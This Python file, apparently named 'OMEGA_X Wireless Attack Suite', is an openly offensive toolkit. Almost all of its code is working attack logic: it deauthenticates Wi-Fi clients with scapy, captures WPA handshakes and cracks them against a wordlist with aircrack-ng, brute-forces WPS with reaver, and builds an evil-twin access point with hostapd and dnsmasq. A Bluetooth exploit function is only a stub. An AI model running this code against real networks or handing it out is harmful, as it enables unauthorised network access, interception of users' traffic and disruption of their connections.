#!/usr/bin/env python3
"""
OMEGA_X Wireless Attack Suite
==============================

Comprehensive wireless network exploitation toolkit.

This module provides advanced wireless attack capabilities:
- WiFi network scanning and enumeration
- WEP/WPA/WPA2 cracking
- Deauthentication attacks
- Evil twin AP creation
- Wireless MITM attacks
- Bluetooth exploitation
- IoT device attacks

TARGETS:
- Wireless networks (2.4GHz/5GHz)
- Bluetooth devices
- IoT smart devices
- Wireless cameras and sensors
- Mobile hotspots

ATTACK VECTORS:
- Passive monitoring and sniffing
- Active deauthentication
- Fake AP creation and captive portals
- WPS attacks
- Bluetooth pairing exploits
- Zigbee and Z-Wave attacks

AUTHOR: OMEGA_X Development Team
VERSION: 1.0
"""

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
import argparse
import re
import json

try:
    from scapy.all import *
    import netifaces
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Install required packages: pip install scapy netifaces")
    sys.exit(1)

class WirelessAttackSuite:
    """Comprehensive wireless network exploitation system"""

    def __init__(self, interface=None, target_bssid=None, target_channel=None):
        self.interface = interface or self.get_wireless_interface()
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        self.monitor_mode = False
        self.attack_active = False
        self.access_points = []
        self.clients = []
        self.handshakes = []
        self.attack_log = []

        # Attack statistics
        self.stats = {
            'aps_discovered': 0,
            'clients_found': 0,
            'handshakes_captured': 0,
            'deauth_packets_sent': 0,
            'start_time': None,
            'end_time': None
        }

    def get_wireless_interface(self):
        """Get wireless interface"""
        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                if iface.startswith(('wlan', 'wifi', 'ath')):
                    return iface
        except:
            pass

        # Fallback
        return 'wlan0'

    def log(self, message, level="info"):
        """Log wireless attack activity"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level.upper()}] {message}"
        self.attack_log.append(log_entry)
        print(log_entry)

    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        self.log(f"Enabling monitor mode on {self.interface}")

        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)

            # Enable monitor mode
            result = subprocess.run(['airmon-ng', 'start', self.interface],
                                  capture_output=True, text=True)

            if result.returncode == 0:
                # Extract monitor interface name
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'monitor mode enabled' in line:
                        # Extract interface name
                        match = re.search(r'\((\w+)\)', line)
                        if match:
                            self.interface = match.group(1)
                            break

                self.monitor_mode = True
                self.log(f"Monitor mode enabled on {self.interface}")
                return True
            else:
                self.log("Failed to enable monitor mode", "error")
                return False

        except Exception as e:
            self.log(f"Monitor mode error: {e}", "error")
            return False

    def disable_monitor_mode(self):
        """Disable monitor mode"""
        try:
            subprocess.run(['airmon-ng', 'stop', self.interface], capture_output=True)
            self.monitor_mode = False
            self.log("Monitor mode disabled")
        except Exception as e:
            self.log(f"Error disabling monitor mode: {e}", "error")

    def scan_networks(self, duration=30):
        """Scan for wireless networks"""
        self.log(f"Scanning wireless networks for {duration} seconds...")

        if not self.monitor_mode:
            if not self.enable_monitor_mode():
                return []

        try:
            # Use airodump-ng to scan
            cmd = ['airodump-ng', self.interface, '--output-format', 'json', '-w', '/tmp/omega_scan']

            # Run scan in background
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            time.sleep(duration)

            # Stop scanning
            process.terminate()
            process.wait()

            # Parse results
            aps = []
            try:
                with open('/tmp/omega_scan-01.json', 'r') as f:
                    data = json.load(f)

                for ap in data.get('APs', []):
                    ap_info = {
                        'bssid': ap.get('BSSID', ''),
                        'ssid': ap.get('ESSID', ''),
                        'channel': ap.get('channel', ''),
                        'encryption': ap.get('Privacy', ''),
                        'signal': ap.get('Power', ''),
                        'clients': []
                    }
                    aps.append(ap_info)

                self.stats['aps_discovered'] = len(aps)
                self.access_points = aps

            except Exception as e:
                self.log(f"Error parsing scan results: {e}", "warning")

            # Cleanup
            subprocess.run(['rm', '-f', '/tmp/omega_scan*'], capture_output=True)

            return aps

        except Exception as e:
            self.log(f"Network scan error: {e}", "error")
            return []

    def deauth_attack(self, target_bssid=None, client_mac=None, count=10):
        """Perform deauthentication attack"""
        target = target_bssid or self.target_bssid
        if not target:
            self.log("No target BSSID specified", "error")
            return False

        self.log(f"Starting deauthentication attack on {target}")

        try:
            # Create deauth packet
            deauth = RadioTap() / Dot11(addr1=client_mac or "ff:ff:ff:ff:ff:ff",
                                       addr2=target, addr3=target) / Dot11Deauth()

            # Send deauth packets
            for i in range(count):
                sendp(deauth, iface=self.interface, verbose=0)
                self.stats['deauth_packets_sent'] += 1
                time.sleep(0.1)

            self.log(f"Sent {count} deauthentication packets")
            return True

        except Exception as e:
            self.log(f"Deauth attack error: {e}", "error")
            return False

    def capture_handshake(self, target_bssid=None, channel=None, duration=60):
        """Capture WPA handshake"""
        target = target_bssid or self.target_bssid
        chan = channel or self.target_channel

        if not target:
            self.log("No target BSSID specified", "error")
            return False

        self.log(f"Capturing handshake for {target} on channel {chan}")

        try:
            # Set channel
            if chan:
                subprocess.run(['iwconfig', self.interface, 'channel', str(chan)], capture_output=True)

            # Start capture with airodump-ng
            cmd = ['airodump-ng', self.interface, '-c', str(chan), '--bssid', target,
                   '--output-format', 'pcap', '-w', '/tmp/omega_handshake']

            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Send deauth to force reconnect
            self.deauth_attack(target, count=5)

            time.sleep(duration)

            process.terminate()
            process.wait()

            # Check for handshake
            result = subprocess.run(['aircrack-ng', '/tmp/omega_handshake-01.cap'],
                                  capture_output=True, text=True)

            if 'WPA handshake' in result.stdout:
                self.log("WPA handshake captured!")
                self.stats['handshakes_captured'] += 1
                self.handshakes.append(target)
                return True
            else:
                self.log("No handshake captured", "warning")

            # Cleanup
            subprocess.run(['rm', '-f', '/tmp/omega_handshake*'], capture_output=True)

        except Exception as e:
            self.log(f"Handshake capture error: {e}", "error")

        return False

    def crack_wpa(self, capture_file=None, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Crack WPA password"""
        if not capture_file and not self.handshakes:
            self.log("No capture file or handshake available", "error")
            return False

        capture = capture_file or '/tmp/omega_handshake-01.cap'

        self.log(f"Cracking WPA with wordlist: {wordlist}")

        try:
            cmd = ['aircrack-ng', '-w', wordlist, capture]

            result = subprocess.run(cmd, capture_output=True, text=True)

            # Parse output for key
            lines = result.stdout.split('\n')
            for line in lines:
                if 'KEY FOUND' in line:
                    self.log("WPA key found!")
                    return True

            self.log("WPA cracking failed", "warning")
            return False

        except Exception as e:
            self.log(f"WPA cracking error: {e}", "error")
            return False

    def create_evil_twin(self, target_ssid=None, channel=None):
        """Create evil twin access point"""
        ssid = target_ssid or "Free_WiFi"
        chan = channel or 6

        self.log(f"Creating evil twin AP: {ssid} on channel {chan}")

        try:
            # Configure hostapd
            hostapd_config = f"""
interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={chan}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

            with open('/tmp/hostapd_evil.conf', 'w') as f:
                f.write(hostapd_config)

            # Configure dnsmasq
            dnsmasq_config = """
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""

            with open('/tmp/dnsmasq_evil.conf', 'w') as f:
                f.write(dnsmasq_config)

            # Start evil twin
            subprocess.Popen(['hostapd', '/tmp/hostapd_evil.conf'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq_evil.conf'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            self.log("Evil twin AP created successfully")
            return True

        except Exception as e:
            self.log(f"Evil twin creation error: {e}", "error")
            return False

    def wps_attack(self, target_bssid=None):
        """Perform WPS attack"""
        target = target_bssid or self.target_bssid

        if not target:
            self.log("No target BSSID specified", "error")
            return False

        self.log(f"Starting WPS attack on {target}")

        try:
            cmd = ['reaver', '-i', self.interface, '-b', target, '-vv']

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if 'WPS PIN' in result.stdout:
                self.log("WPS PIN recovered!")
                return True
            else:
                self.log("WPS attack failed", "warning")
                return False

        except subprocess.TimeoutExpired:
            self.log("WPS attack timed out")
        except Exception as e:
            self.log(f"WPS attack error: {e}", "error")

        return False

    def bluetooth_scan(self):
        """Scan for Bluetooth devices"""
        self.log("Scanning for Bluetooth devices...")

        try:
            result = subprocess.run(['hcitool', 'scan'], capture_output=True, text=True, timeout=30)

            devices = []
            lines = result.stdout.split('\n')
            for line in lines[1:]:  # Skip header
                if '\t' in line:
                    mac, name = line.strip().split('\t', 1)
                    devices.append({'mac': mac, 'name': name})

            self.log(f"Found {len(devices)} Bluetooth devices")
            return devices

        except Exception as e:
            self.log(f"Bluetooth scan error: {e}", "error")
            return []

    def bluetooth_exploit(self, target_mac):
        """Exploit Bluetooth device"""
        self.log(f"Attempting Bluetooth exploit on {target_mac}")

        # This would implement various Bluetooth attacks
        # BlueBorne, KNOB, etc.

        self.log("Bluetooth exploitation not fully implemented yet", "warning")
        return False

    def run_wireless_attack_suite(self):
        """Run complete wireless attack suite"""
        self.log("🚀 Starting OMEGA_X Wireless Attack Suite")
        self.log("=" * 50)

        self.stats['start_time'] = datetime.now()

        try:
            # Enable monitor mode
            if not self.enable_monitor_mode():
                return False

            # Scan networks
            aps = self.scan_networks(20)
            if aps:
                self.log(f"Discovered {len(aps)} access points")
                for ap in aps[:5]:  # Show first 5
                    self.log(f"  {ap['ssid']} ({ap['bssid']}) - {ap['encryption']}")

            # If target specified, attack it
            if self.target_bssid:
                self.log(f"Targeting {self.target_bssid}")

                # Deauth attack
                self.deauth_attack(self.target_bssid, count=20)

                # Try to capture handshake
                if self.capture_handshake():
                    self.log("Handshake captured, attempting to crack...")
                    # Note: Actual cracking would take time

                # Try WPS attack
                if self.wps_attack():
                    self.log("WPS attack successful!")

            # Bluetooth attacks
            bt_devices = self.bluetooth_scan()
            if bt_devices:
                for device in bt_devices[:3]:  # Attack first 3
                    self.bluetooth_exploit(device['mac'])

            self.log("Wireless attack suite completed")

        except KeyboardInterrupt:
            self.log("Attack interrupted by user")
        finally:
            self.disable_monitor_mode()
            self.stats['end_time'] = datetime.now()
            self.print_report()

        return True

    def print_report(self):
        """Print attack report"""
        print(f"\n{'='*50}")
        print("🎯 OMEGA_X WIRELESS ATTACK SUITE REPORT")
        print(f"{'='*50}")

        runtime = self.stats['end_time'] - self.stats['start_time']
        print(f"Attack Duration: {runtime}")
        print(f"APs Discovered: {self.stats['aps_discovered']}")
        print(f"Clients Found: {self.stats['clients_found']}")
        print(f"Handshakes Captured: {self.stats['handshakes_captured']}")
        print(f"Deauth Packets Sent: {self.stats['deauth_packets_sent']}")

        print(f"\n✅ Wireless attack suite completed successfully")

def main():
    parser = argparse.ArgumentParser(description="OMEGA_X Wireless Attack Suite")
    parser.add_argument("--interface", help="Wireless interface")
    parser.add_argument("--target", help="Target BSSID")
    parser.add_argument("--channel", type=int, help="Target channel")
    parser.add_argument("--scan", action="store_true", help="Scan networks only")
    parser.add_argument("--deauth", action="store_true", help="Perform deauth attack")
    parser.add_argument("--handshake", action="store_true", help="Capture handshake")
    parser.add_argument("--wps", action="store_true", help="Perform WPS attack")
    parser.add_argument("--evil-twin", help="Create evil twin AP with SSID")

    args = parser.parse_args()

    suite = WirelessAttackSuite(
        interface=args.interface,
        target_bssid=args.target,
        target_channel=args.channel
    )

    if args.scan:
        aps = suite.scan_networks()
        print("\nDiscovered networks:")
        for ap in aps:
            print(f"  {ap['ssid']} - {ap['bssid']} - Ch{ap['channel']} - {ap['encryption']}")
        return

    if args.deauth:
        suite.enable_monitor_mode()
        suite.deauth_attack(count=50)
        suite.disable_monitor_mode()
        return

    if args.handshake:
        suite.enable_monitor_mode()
        suite.capture_handshake()
        suite.disable_monitor_mode()
        return

    if args.wps:
        suite.enable_monitor_mode()
        suite.wps_attack()
        suite.disable_monitor_mode()
        return

    if args.evil_twin:
        suite.create_evil_twin(args.evil_twin)
        return

    # Full attack suite
    success = suite.run_wireless_attack_suite()

    if success:
        print("\n🎉 Wireless attack suite completed!")
    else:
        print("\n❌ Wireless attack suite failed!")
        sys.exit(1)

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print("❌ This tool requires root privileges")
        print("Run with: sudo python3 wireless_attack_suite.py")
        sys.exit(1)

    try:
        main()
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        sys.exit(1)
